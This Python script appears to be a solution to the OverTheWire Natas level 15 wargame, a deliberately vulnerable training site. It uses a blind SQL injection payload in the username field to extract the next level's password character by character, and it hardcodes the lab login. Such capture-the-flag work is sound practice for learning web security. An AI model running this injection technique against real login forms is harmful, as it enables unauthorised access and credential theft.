import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas15.natas.labs.overthewire.org'
auth = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')


def bruteforce(password):
    data = {
            'username': f'natas16" and password LIKE BINARY "{password}";-- -'
            }
    req = requests.post(f'{url}/index.php', data=data, auth=auth)
    if "This user doesn't exist." in req.text:
        return False
    else:
        return True

special_characters = ['_', '%', '?', '\\', '^', '"', '\'']

password = ''
while True:
    if bruteforce(password):
        break
    for i in range(33, 123):
        current = ''
        if chr(i) in special_characters:
            current = f'\{chr(i)}'
        else:
            current = f'{chr(i)}'

        found_char = bruteforce(f'{password}{current}%')
        print(f'\r{password}{current}', flush=False, end=' ')
        if found_char:
            password += current
            break